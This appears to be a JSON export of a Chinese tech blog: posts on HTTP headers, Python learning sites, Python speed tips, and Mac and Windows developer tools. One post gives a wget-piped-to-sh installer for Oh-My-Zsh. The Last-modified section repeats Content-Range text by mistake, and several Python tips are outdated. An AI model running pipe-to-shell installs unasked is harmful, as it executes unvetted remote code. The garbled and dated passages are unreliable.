Accept-Language:zh-cn (CRLF) Accept-Encoding:gzip,deflate (CRLF) If-Modified-Since:Wed,05 Jan 2007 11:21:25 GMT (CRLF) If-None-Match:W/&quot;80b1a4c018f3c41:8317&quot; (CRLF) User-Agent:Mozilla/4.0(compatible;MSIE6.0;Windows NT 5.0) (CRLF) Host:www.guet.edu.cn (CRLF) Connection:Keep-Alive (CRLF) (CRLF) bodybody包涵请求的实体。 Response状态码响应消息的第一行为下面的格式：HTTP-VersionSPStatus-CodeSPReason-PhraseCRLFHTTP-Version表示支持的HTTP版本，例如为HTTP/1.1。Status-Code是一个三个数字的结果代码。Reason-Phrase给Status-Code提供一个简单的文本描述。Status-Code主要用于机器自动识别，Reason-Phrase主要用于帮助用户理解。Status-Code的第一个数字定义响应的类别，后两个数字没有分类的作用。第一个数字可能取5个不同的值：1xx:信息响应类，表示接收到请求并且继续处理2xx:处理成功响应类，表示动作被成功接收、理解和接受3xx:重定向响应类，为了完成指定的动作，必须接受进一步处理4xx:客户端错误，客户请求包含语法错误或者是不能正确执行5xx:服务端错误，服务器不能正确执行一个正确的请求 响应头响应头域允许服务器传递不能放在状态行的附加信息，这些域主要描述服务器的信息和Request-URI进一步的信息。响应头域包含Age、Location、Proxy-Authenticate、Public、Retry-After、Server、Vary、Warning、WWW-Authenticate。对响应头域的扩展要求通讯双方都支持，如果存在不支持的响应头域，一般将会作为实体头域处理。 典型的响应消息：HTTP/1.0200OK Date:Mon,31Dec200104:25:57GMT Server:Apache/1.3.14(Unix) Content-type:text/html Last-modified:Tue,17Apr200106:46:28GMT Etag:&quot;a030f020ac7c01:1e9f&quot; Content-length:39725426 Content-range:bytes55******/40279980 上例第一行表示HTTP服务端响应一个GET方法。棕色的部分表示响应头域的信息，绿色的部分表示通用头部分，红色的部分表示实体头域的信息。 Location响应头Location响应头用于重定向接收者到一个新URI地址。 Server响应头Server响应头包含处理请求的原始服务器的软件信息。此域能包含多个产品标识和注释，产品标识一般按照重要性排序。 实体信息请求消息和响应消息都可以包含实体信息，实体信息一般由实体头域和实体组成。实体头域包含关于实体的原信息，实体头包括Allow、Content-Base、Content-Encoding、Content-Language、Content-Length、Content-Location、Content-MD5、Content-Range、Content-Type、Etag、Expires、Last-Modified、extension-header。extension-header允许客户端定义新的实体头，但是这些域可能无法被接受方识别。实体可以是一个经过编码的字节流，它的编码方式由Content-Encoding或Content-Type定义，它的长度由Content-Length或Content-Range定义。 Content-Type实体头Content-Type实体头用于向接收方指示实体的介质类型，指定HEAD方法送到接收方的实体介质类型，或GET方法发送的请求介质类型 Content-Range实体头Content-Range实体头用于指定整个实体中的一部分的插入位置，他也指示了整个实体的长度。在服务器向客户返回一个部分响应，它必须描述响应覆盖的范围和整个实体长度。一般格式：Content-Range:bytes-unitSPfirst-byte-pos-last-byte-pos/entity-legth例如，传送头500个字节次字段的形式：Content-Range:bytes0-499/1234如果一个http消息包含此节（例如，对范围请求的响应或对一系列范围的重叠请求），Content-Range表示传送的范围，Content-Length表示实际传送的字节数。 Last-modified实体头Last-modified实体头指定服务器上保存内容的最后修订时间。例如，传送头500个字节次字段的形式：Content-Range:bytes0-499/1234如果一个http消息包含此节（例如，对范围请求的响应或对一系列范围的重叠请求），Content-Range表示传送的范围，Content-Length表示实际传送的字节数。 熟悉HTTP是web工程师的基本功","tags":[{"name":"HTTP","slug":"HTTP","permalink":"https://www.duyidong.com/tags/HTTP/"}]},{"title":"推荐几个学习Python还不错的网站","date":"2016-03-29T13:16:04.000Z","path":"2016/03/29/推荐几个学习python还不错的网站/","text":"一开始自学python我去过慕课网和极客学院，这种学习网站比较系统化但是缺点是不便于记忆和不方便查阅，到后面我才发现文档才是最好的老师。不过还是有些个人博客，网站写的比较好的，在这里推荐两个： 廖雪峰的官方网站http://www.liaoxuefeng.com/ 这个主要是python3和js，git讲得也不错，通俗易懂，适合新手 菜鸟教程http://www.runoob.com/python 菜鸟教程很多课程都不错，东西还比较多 官方文档https://docs.python.org/3/library/ 另外，最好的老师，还是官方文档，这里附上python3官方文档的地址 再来个python包下载地址http://www.lfd.uci.edu/~gohlke/pythonlibs/","tags":[{"name":"学习","slug":"学习","permalink":"https://www.duyidong.com/tags/学习/"},{"name":"Python","slug":"Python","permalink":"https://www.duyidong.com/tags/Python/"}]},{"title":"Python代码优化小技巧","date":"2016-03-29T12:26:33.000Z","path":"2016/03/29/Python代码优化小技巧/","text":"一个良好的算法能够对性能起到关键作用，因此性能改进的首要点是对算法的改进。在算法的时间复杂度排序上依次是： O(1) -&gt; O(lg n) -&gt; O(n lg n) -&gt; O(n^2) -&gt; O(n^3) -&gt; O(n^k) -&gt; O(k^n) -&gt; O(n!) 因此如果能够在时间复杂度上对算法进行一定的改进，对性能的提高不言而喻。但对具体算法的改进不属于本文讨论的范围，读者可以自行参考这方面资料。下面的内容将集中讨论数据结构的选择。 字典 (dictionary) 与列表 (list)Python 字典中使用了 hash table，因此查找操作的复杂度为 O(1)，而 list 实际是个数组，在 list 中，查找需要遍历整个 list，其复杂度为 O(n)，因此对成员的查找访问等操作字典要比 list 更快。 清单 1. 代码 dict.py from time import time t = time() list = [&#39;a&#39;,&#39;b&#39;,&#39;is&#39;,&#39;python&#39;,&#39;jason&#39;,&#39;hello&#39;,&#39;hill&#39;,&#39;with&#39;,&#39;phone&#39;,&#39;test&#39;, &#39;dfdf&#39;,&#39;apple&#39;,&#39;pddf&#39;,&#39;ind&#39;,&#39;basic&#39;,&#39;none&#39;,&#39;baecr&#39;,&#39;var&#39;,&#39;bana&#39;,&#39;dd&#39;,&#39;wrd&#39;] #list = dict.fromkeys(list,True) print list filter = [] for i in range (1000000): for find in [&#39;is&#39;,&#39;hat&#39;,&#39;new&#39;,&#39;list&#39;,&#39;old&#39;,&#39;.&#39;]: if find not in list: filter.append(find) print(&quot;total run time:&quot;) print(time()-t) 上述代码运行大概需要 16.09seconds。如果去掉行 #list = dict.fromkeys(list,True) 的注释，将 list 转换为字典之后再运行，时间大约为 8.375 seconds，效率大概提高了一半。因此在需要多数据成员进行频繁的查找或者访问的时候，使用 dict 而不是 list 是一个较好的选择。 集合 (set) 与列表 (list)set 的 union， intersection，difference 操作要比 list 的迭代要快。因此如果涉及到求 list 交集，并集或者差的问题可以转换为 set 来操作。 清单 2. 求 list 的交集： from time import time t = time() lista=[1,2,3,4,5,6,7,8,9,13,34,53,42,44] listb=[2,4,6,9,23] intersection=[] for i in range (1000000): for a in lista: for b in listb: if a == b: intersection.append(a) print(&quot;total run time:&quot;) print (time()-t) 上述程序的运行时间大概为： total run time: 38.4070000648 清单 3. 使用 set 求交集 from time import time t = time() lista=[1,2,3,4,5,6,7,8,9,13,34,53,42,44] listb=[2,4,6,9,23] intersection=[] for i in range (1000000): list(set(lista)&amp;set(listb)) print(&quot;total run time:&quot;) print(time()-t) 改为 set 后程序的运行时间缩减为 8.75，提高了 4 倍多，运行时间大大缩短。读者可以自行使用表 1 其他的操作进行测试。表 1. set 常见用法语法 操作 说明 set(list1) | set(list2) union 包含 list1 和 list2 所有数据的新集合 set(list1) &amp; set(list2) intersection 包含 list1 和 list2 中共同元素的新集合 set(list1) - set(list2) difference 在 list1 中出现但不在 list2 中出现的元素的集合 清单 4. 利用 Lazy if-evaluation 的特性 from time import time t = time() abbreviations = [&#39;cf.&#39;, &#39;e.g.&#39;, &#39;ex.&#39;, &#39;etc.&#39;, &#39;fig.&#39;, &#39;i.e.&#39;, &#39;Mr.&#39;, &#39;vs.&#39;] for i in range (1000000): for w in (&#39;Mr.&#39;, &#39;Hat&#39;, &#39;is&#39;, &#39;chasing&#39;, &#39;the&#39;, &#39;black&#39;, &#39;cat&#39;, &#39;.&#39;): if w in abbreviations: #if w[-1] == &#39;.&#39; and w in abbreviations: pass print(&quot;total run time:&quot;) print(time()-t) 在未进行优化之前程序的运行时间大概为 8.84，如果使用注释行代替第一个 if，运行的时间大概为 6.17。 字符串的优化python 中的字符串对象是不可改变的，因此对任何字符串的操作如拼接，修改等都将产生一个新的字符串对象，而不是基于原字符串，因此这种持续的 copy 会在一定程度上影响 python 的性能。对字符串的优化也是改善性能的一个重要的方面，特别是在处理文本较多的情况下。字符串的优化主要集中在以下几个方面： 在字符串连接的使用尽量使用 join() 而不是 +：在代码清单 7 中使用 + 进行字符串连接大概需要 0.125 s，而使用 join 缩短为 0.016s。因此在字符的操作上 join 比 + 要快，因此要尽量使用 join 而不是 +。 清单 5. 使用 join 而不是 + 连接字符串 from time import time t = time() s = &quot;&quot; list = [&#39;a&#39;,&#39;b&#39;,&#39;b&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;] for i in range (10000): for substr in list: s+= substr print(&quot;total run time:&quot;) print(time()-t) 同时要避免： s = &quot;&quot; for x in list: s += func(x) 而是要使用： slist = [func(elt) for elt in somelist] s = &quot;&quot;.join(slist) 当对字符串可以使用正则表达式或者内置函数来处理的时候，选择内置函数。如 str.isalpha()，str.isdigit()，str.startswith((‘x’, ‘yz’))，str.endswith((‘x’, ‘yz’))对字符进行格式化比直接串联读取要快，因此要使用 out = &quot;&lt;html&gt;%s%s%s%s&lt;/html&gt;&quot; % (head, prologue, query, tail) 而避免 out = &quot;&lt;html&gt;&quot; + head + prologue + query + tail + &quot;&lt;/html&gt;&quot; 其他优化技巧如果需要交换两个变量的值使用 a,b=b,a 而不是借助中间变量 t=a;a=b;b=t； &gt;&gt;&gt; from timeit import Timer &gt;&gt;&gt; Timer(&quot;t=a;a=b;b=t&quot;,&quot;a=1;b=2&quot;).timeit() 0.25154118749729365 &gt;&gt;&gt; Timer(&quot;a,b=b,a&quot;,&quot;a=1;b=2&quot;).timeit() 0.17156677734181258 &gt;&gt;&gt; 使用局部变量，避免”global” 关键字。python 访问局部变量会比全局变量要快得多，因 此可以利用这一特性提升性能。 if done is not None 比语句 if done != None 更快，读者可以自行验证； 在耗时较多的循环中，可以把函数的调用改为内联的方式； 使用级联比较 “x &lt; y &lt; z” 而不是 “x &lt; y and y &lt; z”； while 1 要比 while True 更快（当然后者的可读性更好）； build in 函数通常较快，add(a,b) 要优于 a+b。","tags":[{"name":"代码","slug":"代码","permalink":"https://www.duyidong.com/tags/代码/"},{"name":"Python","slug":"Python","permalink":"https://www.duyidong.com/tags/Python/"}]},{"title":"程序员工具（mac）","date":"2016-03-24T14:26:14.000Z","path":"2016/03/24/程序员工具（mac）/","text":"mac下有关的程序员工具 item2代替苹果自带的终端，好看，而且功能更丰富。 下载地址：https://www.iterm2.com/ Oh-My-Zsh一款功能更加强大的shell。 自动安装： wget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh -O - | sh 手动安装： git clone git://github.com/robbyrussell/oh-my-zsh.git ~/.oh-my-zsh cp ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc","tags":[{"name":"工具","slug":"工具","permalink":"https://www.duyidong.com/tags/工具/"}]},{"title":"程序员工具（windows）","date":"2016-03-24T13:31:48.000Z","path":"2016/03/24/程序员工具（windows）/","text":"windows下好用的程序员工具 Lanuchy代替mac的Spotlight，虽然功能没有Spotlight完善，但还是非常好用，比如可以执行kill命令结束掉进程，可以快捷运行应用程序，还可以做简单的计算器使用。 everything作为一款开源的强大的windows文件查询软件，它将系统中所有文件名保存成一个字典，可以迅速查询系统内文件，比windows自带的搜索功能不知道好用多少倍。 InternetDownloadManager面对迅雷日益臃肿，浏览器自带下载功能残废的今天，你需要一款轻巧，支持断点续传的下载器，IDM是不二人选。 关于数据库navicat premium可以支持多种数据库：MySQL、MariaDB、SQL Server、SQLite、Oracle 和 PostgreSQL ，功能强大，操作便捷。 关于浏览器firefox开发者工具很好看，可以换肤，恩，插件还可以。 chrom毫无疑问是因为Chrome的网上应用商店，还有他的断点调试功能比较方便，但个人觉得它的开发者工具没有火狐好用。 SUblimen Text 3之所以把Sublime作为一款软件来说是因为他是windows下兼顾GUI和性能比较理想的一款文本编辑器，windows自带的记事本和Word会在文件头加BOOM标记所以不推荐在写代码时使用，最理想的还是Sublime。下面附上Sublime的一些常见设置： { &quot;bold_folder_labels&quot;: true, &quot;color_scheme&quot;: &quot;Packages/User/Monokai (SublimePythonIDE).tmTheme&quot;, &quot;create_window_at_startup&quot;: false, &quot;default_encoding&quot;: &quot;UTF-8&quot;, &quot;ensure_newline_at_eof_on_save&quot;: true, &quot;font_size&quot;: 10, &quot;highlight_modified_tabs&quot;: true, &quot;hot_exit&quot;: true, &quot;ignored_packages&quot;: [ &quot;Vintage&quot; ], &quot;open_files_in_new_window&quot;: false, &quot;remember_full_screen&quot;: true, &quot;remember_open_files&quot;: true, &quot;tab_size&quot;: 4, &quot;translate_tabs_to_spaces&quot;: true, &quot;trim_trailing_white_space_on_save&quot;: true } = = 都是英文相信你应该看得懂，我就不写注释了。 如果看不懂。。出门左转下个[有道词典](http://cidian.youdao.com/multi.html)吧。","tags":[{"name":"工具","slug":"工具","permalink":"https://www.duyidong.com/tags/工具/"}]}]